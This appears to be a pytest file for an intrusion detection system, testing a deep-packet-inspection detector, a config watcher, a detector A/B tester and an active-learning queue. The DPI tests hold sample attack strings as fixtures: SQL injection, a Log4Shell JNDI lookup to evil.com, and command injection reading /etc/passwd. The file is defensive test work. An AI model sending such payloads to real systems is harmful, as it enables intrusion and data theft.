"""
Tests for Phase 6 advanced features:
  - core/dpi_plugin.py     (DPIDetector)
  - core/advanced_features.py (ConfigWatcher, MLABTester, ActiveLearningQueue)
"""

from __future__ import annotations

import os
import sys
import time
import threading
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


# ===========================================================================
# DPI Plugin
# ===========================================================================

class TestDPIDetector:

    @pytest.fixture
    def dpi(self):
        from core.dpi_plugin import DPIDetector
        d = DPIDetector(config={})
        d.on_start()   # Scapy unavailable in test env — graceful fallback
        return d

    def test_no_events_no_trigger(self, dpi):
        from core.detector_abc import DetectorResult
        result = dpi.analyze("1.2.3.4", [])
        assert isinstance(result, DetectorResult)
        assert not result.triggered

    def test_sql_injection_payload_triggers(self, dpi):
        dpi.feed_packet("5.5.5.5", b"GET /search?q=1' UNION SELECT 1,2,3-- HTTP/1.1\r\n")
        events = [MagicMock(ip="5.5.5.5", port=80, timestamp=time.time())]
        result = dpi.analyze("5.5.5.5", events)
        assert result.triggered
        assert result.score > 0.5
        assert "sql_injection" in result.reason

    def test_log4j_payload_triggers_max_score(self, dpi):
        dpi.feed_packet("6.6.6.6", b"${jndi:ldap://evil.com/a}")
        events = [MagicMock(ip="6.6.6.6", port=443, timestamp=time.time())]
        result = dpi.analyze("6.6.6.6", events)
        assert result.triggered
        assert result.score >= 0.85   # log4j score=0.99 → block action
        assert result.action in ("alert", "block")

    def test_cmd_injection_payload(self, dpi):
        dpi.feed_packet("7.7.7.7", b"POST /api HTTP/1.1\nUser-Agent: $(cat /etc/passwd)")
        events = [MagicMock(ip="7.7.7.7", port=8080, timestamp=time.time())]
        result = dpi.analyze("7.7.7.7", events)
        assert result.triggered

    def test_suspicious_port_heuristic(self, dpi):
        events = [
            MagicMock(ip="8.8.8.8", port=4444, timestamp=time.time()),  # Metasploit
            MagicMock(ip="8.8.8.8", port=9001, timestamp=time.time()),  # Tor
        ]
        result = dpi.analyze("8.8.8.8", events)
        assert result.triggered
        assert "suspicious_ports" in result.reason

    def test_c2_beacon_detection(self, dpi):
        """Uniform inter-arrival times → C2 beacon."""
        base = time.time()
        # 10 connections exactly 5 seconds apart (very regular = beacon)
        events = [
            MagicMock(ip="9.9.9.9", port=443, timestamp=base + i * 5.0)
            for i in range(10)
        ]
        result = dpi.analyze("9.9.9.9", events)
        assert result.triggered
        assert "c2_beacon" in result.reason

    def test_random_traffic_no_beacon(self, dpi):
        """Irregular traffic should NOT trigger beacon detection."""
        import random
        base = time.time()
        events = [
            MagicMock(ip="10.0.0.1", port=80, timestamp=base + random.uniform(0, 300))
            for _ in range(10)
        ]
        result = dpi.analyze("10.0.0.1", events)
        # May or may not trigger on port — but beacon should NOT be present
        if result.triggered:
            assert "c2_beacon" not in result.reason

    def test_feed_and_clear_captures(self, dpi):
        dpi.feed_packet("11.11.11.11", b"benign payload")
        assert dpi.get_capture_summary().get("11.11.11.11", 0) == 1
        dpi.clear_captures("11.11.11.11")
        assert dpi.get_capture_summary().get("11.11.11.11", 0) == 0

    def test_clear_all_captures(self, dpi):
        for ip in ["1.1.1.1", "2.2.2.2", "3.3.3.3"]:
            dpi.feed_packet(ip, b"data")
        dpi.clear_captures()
        assert dpi.get_capture_summary() == {}

    def test_on_stop_clears_buffer(self, dpi):
        dpi.feed_packet("12.0.0.1", b"data")
        dpi.on_stop()
        assert dpi.get_capture_summary() == {}

    def test_buffer_size_bounded(self, dpi):
        """Buffer must not grow beyond 50 entries per IP."""
        for i in range(60):
            dpi.feed_packet("13.0.0.1", b"x" * 10)
        assert dpi.get_capture_summary()["13.0.0.1"] <= 50

    def test_result_score_in_range(self, dpi):
        dpi.feed_packet("14.0.0.1", b"'; DROP TABLE users; --")
        events = [MagicMock(ip="14.0.0.1", port=3306, timestamp=time.time())]
        result = dpi.analyze("14.0.0.1", events)
        assert 0.0 <= result.score <= 1.0

    def test_disabled_dpi_no_trigger(self):
        from core.dpi_plugin import DPIDetector
        d = DPIDetector(config={"dpi": {"enabled": False}})
        d.feed_packet("99.99.99.99", b"${jndi:ldap://evil.com}")
        events = [MagicMock(ip="99.99.99.99", port=80, timestamp=time.time())]
        result = d.analyze("99.99.99.99", events)
        assert not result.triggered

    def test_plugin_name_version(self, dpi):
        assert dpi.name == "dpi"
        assert dpi.version == "1.1.0"


# ===========================================================================
# ConfigWatcher
# ===========================================================================

class TestConfigWatcher:

    def test_no_change_no_callback(self, tmp_path):
        from core.advanced_features import ConfigWatcher
        f = tmp_path / "cfg.yaml"
        f.write_text("key: value\n")
        called = []
        watcher = ConfigWatcher(
            paths=[str(f)], on_change=lambda p: called.append(p), poll_interval=0.1
        )
        watcher.start()
        time.sleep(0.3)
        watcher.stop()
        assert called == []

    def test_change_triggers_callback(self, tmp_path):
        from core.advanced_features import ConfigWatcher
        f = tmp_path / "cfg.yaml"
        f.write_text("key: value\n")
        called = []
        watcher = ConfigWatcher(
            paths=[str(f)], on_change=lambda p: called.extend(p), poll_interval=0.1
        )
        watcher.start()
        time.sleep(0.15)
        f.write_text("key: changed\n")
        time.sleep(0.35)
        watcher.stop()
        assert any(str(f) in str(p) for p in called)

    def test_force_check_detects_change(self, tmp_path):
        from core.advanced_features import ConfigWatcher
        f = tmp_path / "cfg.yaml"
        f.write_text("v: 1\n")
        called = []
        watcher = ConfigWatcher(
            paths=[str(f)], on_change=lambda p: called.extend(p), poll_interval=999
        )
        f.write_text("v: 2\n")
        changed = watcher.force_check()
        assert len(changed) > 0

    def test_start_stop_idempotent(self, tmp_path):
        from core.advanced_features import ConfigWatcher
        f = tmp_path / "x.yaml"
        f.write_text("")
        watcher = ConfigWatcher(paths=[str(f)], on_change=lambda p: None, poll_interval=1.0)
        watcher.start()
        watcher.start()   # second start must be safe
        assert watcher.is_alive
        watcher.stop()
        watcher.stop()    # second stop must be safe

    def test_directory_watching(self, tmp_path):
        from core.advanced_features import ConfigWatcher
        (tmp_path / "r1.yaml").write_text("rule: a\n")
        called = []
        watcher = ConfigWatcher(
            paths=[str(tmp_path)], on_change=lambda p: called.extend(p), poll_interval=0.1
        )
        watcher.start()
        time.sleep(0.15)
        (tmp_path / "r2.yaml").write_text("rule: b\n")
        time.sleep(0.35)
        watcher.stop()
        assert any("r2.yaml" in str(p) for p in called)

    def test_callback_exception_does_not_kill_watcher(self, tmp_path):
        from core.advanced_features import ConfigWatcher
        f = tmp_path / "cfg.yaml"
        f.write_text("a: 1\n")

        def bad_callback(paths):
            raise RuntimeError("whoops")

        watcher = ConfigWatcher(paths=[str(f)], on_change=bad_callback, poll_interval=0.1)
        watcher.start()
        f.write_text("a: 2\n")
        time.sleep(0.35)
        assert watcher.is_alive   # must survive the callback exception
        watcher.stop()


# ===========================================================================
# MLABTester
# ===========================================================================

class _HighDetector:
    """Always triggers at score 0.9."""
    name = "high"; version = "1.0"
    def analyze(self, ip, events, *, context=None):
        from core.detector_abc import DetectorResult
        return DetectorResult(triggered=True, score=0.9, reason="high")

class _LowDetector:
    """Never triggers."""
    name = "low"; version = "1.0"
    def analyze(self, ip, events, *, context=None):
        from core.detector_abc import DetectorResult
        return DetectorResult(triggered=False, score=0.1)


class TestMLABTester:

    def _tester(self, min_samples=5):
        from core.advanced_features import MLABTester
        return MLABTester(_HighDetector(), _LowDetector(), min_samples=min_samples)

    def test_run_returns_champion_result(self):
        tester = self._tester()
        result = tester.run("1.1.1.1", [])
        assert result.triggered       # _HighDetector wins

    def test_summary_counts(self):
        tester = self._tester()
        for _ in range(10):
            tester.run("1.2.3.4", [])
        s = tester.summary()
        assert s.samples == 10
        assert s.agreements == 0     # high always fires, low never
        assert s.champion_wins == 10
        assert s.challenger_wins == 0
        assert s.agreement_rate == 0.0

    def test_promote_challenger_when_wins_exceed_threshold(self):
        """If challenger wins significantly, it should be promoted."""
        from core.advanced_features import MLABTester
        # Make champion never trigger, challenger always trigger
        tester = MLABTester(_LowDetector(), _HighDetector(), min_samples=3)
        for _ in range(5):
            tester.run("2.2.2.2", [])
        winner = tester.choose_champion()
        # High challenger wins more → promoted
        assert winner.name == "high"

    def test_keep_champion_if_insufficient_samples(self):
        tester = self._tester(min_samples=1000)
        for _ in range(5):
            tester.run("1.1.1.1", [])
        winner = tester.choose_champion()
        assert winner.name == "high"   # champion retained due to low sample count

    def test_uncertain_samples(self):
        tester = self._tester()
        for _ in range(20):
            tester.run("3.3.3.3", [])
        uncertain = tester.uncertain_samples(limit=5)
        assert len(uncertain) <= 5
        for item in uncertain:
            assert hasattr(item, "champion_score")

    def test_reset_clears_records(self):
        tester = self._tester()
        tester.run("4.4.4.4", [])
        tester.reset()
        assert tester.summary().samples == 0

    def test_broken_detector_does_not_raise(self):
        from core.advanced_features import MLABTester

        class BrokenDetector:
            name = "broken"; version = "0"
            def analyze(self, ip, events, *, context=None):
                raise RuntimeError("crash!")

        tester = MLABTester(BrokenDetector(), _LowDetector(), min_samples=1)
        result = tester.run("5.5.5.5", [])
        assert result is not None   # graceful fallback


# ===========================================================================
# ActiveLearningQueue
# ===========================================================================

class TestActiveLearningQueue:

    def test_push_and_pending(self):
        from core.advanced_features import ActiveLearningQueue
        q = ActiveLearningQueue()
        q.push("1.1.1.1", [], {}, 0.8, 0.2)
        assert q.pending_count == 1
        assert q.size == 1

    def test_label_benign(self):
        from core.advanced_features import ActiveLearningQueue
        q = ActiveLearningQueue()
        q.push("2.2.2.2", [], {}, 0.7, 0.3)
        count = q.label("2.2.2.2", "benign")
        assert count == 1
        assert q.labelled_count == 1

    def test_label_malicious(self):
        from core.advanced_features import ActiveLearningQueue
        q = ActiveLearningQueue()
        q.push("3.3.3.3", [], {}, 0.9, 0.1)
        q.label("3.3.3.3", "malicious")
        items = q.labelled_items()
        assert items[0].label == "malicious"

    def test_invalid_label_raises(self):
        from core.advanced_features import ActiveLearningQueue
        q = ActiveLearningQueue()
        q.push("4.4.4.4", [], {}, 0.5, 0.5)
        with pytest.raises(AssertionError):
            q.label("4.4.4.4", "unknown")

    def test_pending_items_filtered(self):
        from core.advanced_features import ActiveLearningQueue
        q = ActiveLearningQueue()
        q.push("5.5.5.5", [], {}, 0.6, 0.4)
        q.push("6.6.6.6", [], {}, 0.3, 0.7)
        q.label("5.5.5.5", "benign")
        pending = q.pending_items()
        assert len(pending) == 1
        assert pending[0].ip == "6.6.6.6"

    def test_labelled_items_min_filter(self):
        from core.advanced_features import ActiveLearningQueue
        q = ActiveLearningQueue()
        q.push("a", [], {}, 0.5, 0.5)
        q.label("a", "benign")
        assert q.labelled_items(min_items=5) == []   # not enough
        assert len(q.labelled_items(min_items=1)) == 1

    def test_clear_labelled(self):
        from core.advanced_features import ActiveLearningQueue
        q = ActiveLearningQueue()
        q.push("a", [], {}, 0.5, 0.5)
        q.label("a", "malicious")
        removed = q.clear_labelled()
        assert removed == 1
        assert q.labelled_count == 0

    def test_max_size_eviction(self):
        from core.advanced_features import ActiveLearningQueue
        q = ActiveLearningQueue(max_size=3)
        for i in range(3):
            q.push(f"10.0.0.{i}", [], {}, 0.5, 0.5)
            q.label(f"10.0.0.{i}", "benign")
        # Queue is full of labelled items — adding a new one should evict oldest labelled
        q.push("10.0.0.99", [], {}, 0.8, 0.2)
        assert q.size <= 3

    def test_thread_safety(self):
        """Concurrent pushes and labels must not corrupt state."""
        from core.advanced_features import ActiveLearningQueue
        q = ActiveLearningQueue(max_size=1000)
        errors = []

        def worker(ip_prefix):
            try:
                for i in range(50):
                    ip = f"{ip_prefix}.{i}"
                    q.push(ip, [], {}, 0.5, 0.5)
                    if i % 2 == 0:
                        q.label(ip, "benign")
            except Exception as exc:
                errors.append(exc)

        threads = [threading.Thread(target=worker, args=(f"10.{j}",)) for j in range(4)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        assert errors == [], f"Thread safety errors: {errors}"
